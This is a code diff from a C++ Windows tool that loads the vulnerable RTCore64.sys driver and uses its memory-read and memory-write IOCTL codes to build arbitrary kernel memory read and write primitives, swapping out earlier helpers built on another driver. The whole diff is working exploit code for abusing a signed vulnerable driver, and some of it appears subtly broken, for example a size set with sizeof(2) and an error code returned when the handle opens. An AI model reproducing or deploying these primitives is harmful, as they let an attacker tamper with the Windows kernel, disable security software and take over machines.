@@ -79,65 +79,100 @@ uint64_t helpers::ResolveRipRelative( uint64_t instrAddress, int32_t offsetOffse
     return instrAddress + offsetOffset + sizeof( int32_t ) + relOffset;
 }
 
-NTSTATUS helpers::read_knrl_mem( HANDLE DeviceHandle, ULONG64 target, DWORD64& outValue ) {
-    GIOMemcpyInput MemcpyInput{};
+
+
+bool helpers::read_32( DWORD64 address, uint32_t& buffer ){
+    MemoryOperation operation{ 0 };
+
+    operation.address = address;
+    operation.size = sizeof( uint32_t );
+    operation.data = buffer;
+
+    if ( !DeviceIoControl( helpers::dev, 0x80002048, &operation, sizeof( operation ), &operation, sizeof( operation ), NULL, NULL ) )
+        return false;
+
+    buffer = static_cast< uint32_t >( operation.data );
+    return true;
+}
+
+bool helpers::write_32( DWORD64 address, uint32_t value )
+{
+    MemoryOperation operation{ 0 };
+    operation.address = address;
+    operation.size = sizeof( 2 );
+    operation.data = value;
+
+    if ( !DeviceIoControl( helpers::dev, 0x8000204C, &operation, sizeof( operation ), &operation, sizeof( operation ), NULL, NULL ) )
+        return false;
+
+    return true;
+}
+
+bool helpers::read_64( DWORD64 address, DWORD64& buffer ){
+    uint32_t low{ 0 };
+    uint32_t high{ 0 };
+
+    if ( !helpers::read_32( address, low ) ) return false;
+
+    if ( !helpers::read_32( address + 4, high ) ) return false;
+
+    buffer = ( static_cast< DWORD64 >( high ) << 32 ) | low; 
+        return true;
+}
+
+bool helpers::write_64( DWORD64 address, DWORD64 value ){
+    uint32_t low = value & 0xFFFFFFFF;
+    uint32_t high =  value >> 32;
+
+    if ( !helpers::write_32( address, low ) )
+        return false;
+
+    if ( !helpers::write_32( address + 4, high ) )
+        return false;
+
+    return true;
+}
+
+static const DWORD RTCORE64_MSR_READ_CODE = 0x80002030;
+static const DWORD RTCORE64_MEMORY_READ_CODE = 0x80002048;
+static const DWORD RTCORE64_MEMORY_WRITE_CODE = 0x8000204c;
+
+NTSTATUS test::WriteMemoryPrimitive( HANDLE Device, DWORD64 Address, DWORD Value ) {
+    helpers::MemoryOperation MemoryRead{};
     IO_STATUS_BLOCK IoStatusBlock{};
 
-    MemcpyInput.Src = { target };
-    MemcpyInput.Dst = reinterpret_cast< ULONG64 >( &outValue );
-    MemcpyInput.Size = sizeof( outValue );
+    MemoryRead.address = Address;
+    MemoryRead.size = sizeof( uint32_t );
+    MemoryRead.data = Value;
+
     RtlZeroMemory( &IoStatusBlock, sizeof( IoStatusBlock ) );
 
-    return NtDeviceIoControlFile( DeviceHandle, nullptr, nullptr, nullptr,
-        &IoStatusBlock, IOCTL_GIO_MEMCPY, &MemcpyInput, sizeof( MemcpyInput ), nullptr, 0 );
+    DWORD BytesReturned{ 0 };
+
+    return DeviceIoControl( Device, RTCORE64_MEMORY_WRITE_CODE, &MemoryRead, sizeof( MemoryRead ), 
+       &MemoryRead, sizeof( MemoryRead ), &BytesReturned, nullptr );
 }
 
-BOOL helpers::RTCoreReadMemory( HANDLE DeviceHandle, ULONG_PTR Address, DWORD ValueSize, DWORD64 &Value ) {
-    
-    RTC64_MEMORY_STRUCT memory_read{};
-    IO_STATUS_BLOCK IoStatusBlock{};
-    // initialize the structure to all zeroes
-    ZeroMemory( &memory_read, sizeof( memory_read ) );
-    ZeroMemory( &IoStatusBlock, sizeof( IoStatusBlock ) );
-
-    memory_read.Address = Address;
-    memory_read.Size = ValueSize;
-
-    return NtDeviceIoControlFile( DeviceHandle, nullptr, nullptr, nullptr,
-        &IoStatusBlock, IOCTL_GIO_MEMCPY, &memory_read, sizeof( memory_read ), nullptr, 0 );
-
-    Value = memory_read.Value;
-
-    return TRUE;
+NTSTATUS test::WriteMemoryDWORD64( HANDLE Device, DWORD64 Address, DWORD64 Value ){
+    test::WriteMemoryPrimitive( Device, Address, Value & 0xffffffff );
+    test::WriteMemoryPrimitive( Device, Address + 4, Value >> 32 );
+    return STATUS_SUCCESS;
 }
 
 
-
-NTSTATUS helpers::write_krnl_mem( HANDLE DeviceHandle, ULONG64 target, DWORD64 value ) {
-    GIOMemcpyInput MemcpyInput{};
-    IO_STATUS_BLOCK IoStatusBlock{};
-
-    MemcpyInput.Src = reinterpret_cast< ULONG64 >( &value );
-    MemcpyInput.Dst = { target };
-    MemcpyInput.Size = sizeof( value );
-    RtlZeroMemory( &IoStatusBlock, sizeof( IoStatusBlock ) );
-
-    return NtDeviceIoControlFile( DeviceHandle, nullptr, nullptr, nullptr,
-        &IoStatusBlock, IOCTL_GIO_MEMCPY, &MemcpyInput, sizeof( MemcpyInput ), nullptr, 0 );
-}
-
-NTSTATUS helpers::EnsureDeviceHandle( HANDLE* outHandle, PWSTR LoaderServiceName ) {
+NTSTATUS helpers::EnsureDeviceHandle( HANDLE* outHandle, PWSTR LoaderServiceName )
+{
     *outHandle = nullptr;
 
     NTSTATUS stat{ STATUS_SUCCESS };
 
     // Try to open first (driver might already be loaded)
     stat = helpers::OpenDeviceHandle( outHandle, FALSE );
-    if ( NT_SUCCESS( stat ) && *outHandle ) return{ STATUS_INVALID_HANDLE };
+    if ( NT_SUCCESS( stat ) && *outHandle ) return STATUS_INVALID_HANDLE;
 
     // Try to load the driver
     stat = helpers::LoadDriver( LoaderServiceName );
-    if ( !NT_SUCCESS( stat ) ) return{ STATUS_INVALID_HANDLE };
+    if ( !NT_SUCCESS( stat ) ) return STATUS_INVALID_HANDLE;
 
     wprintf( L"[+] Vuln (RTCore64.sys) loaded successfully\n" );
 
@@ -145,23 +180,25 @@ NTSTATUS helpers::EnsureDeviceHandle( HANDLE* outHandle, PWSTR LoaderServiceName
 
     // Try to open device again after loading
     stat = helpers::OpenDeviceHandle( outHandle, 0 );
-    if ( !NT_SUCCESS( stat ) || !*outHandle ) return{ STATUS_INVALID_HANDLE };
+    if ( !NT_SUCCESS( stat ) || !*outHandle ) return STATUS_INVALID_HANDLE;
 
     wprintf( L"[*] Device handle opened successfully: %p\n", *outHandle );
+
     return stat;
 }
 
-/* 
-* rdx,              NT_Object_Manager_namespace ; "\\Device\\RTCore64" 
-* lea               rcx, [rsp+78h+DestinationString] ; DestinationString
-* call              cs:RtlInitUnicodeString
-* lea               rdx, symbolic_link ; "\\DosDevices\\RTCore64"
-* lea               rcx, [rsp+78h+SymbolicLinkName] ; DestinationString
-*/
 
 NTSTATUS helpers::OpenDeviceHandle( PHANDLE DeviceHandle, BOOLEAN PrintErrors )
 {
     UNICODE_STRING devName = RTL_CONSTANT_STRING( L"\\Device\\RTCore64" ); 
+    /* 
+    * rdx,              NT_Object_Manager_namespace ; "\\Device\\RTCore64" 
+    * lea               rcx, [rsp+78h+DestinationString] ; DestinationString
+    * call              cs:RtlInitUnicodeString
+    * lea               rdx, symbolic_link ; "\\DosDevices\\RTCore64"
+    * lea               rcx, [rsp+78h+SymbolicLinkName] ; DestinationString
+    */
+
     OBJECT_ATTRIBUTES ObjectAttributes = RTL_CONSTANT_OBJECT_ATTRIBUTES( &devName, OBJ_CASE_INSENSITIVE );
     IO_STATUS_BLOCK IoStatusBlock{};
 
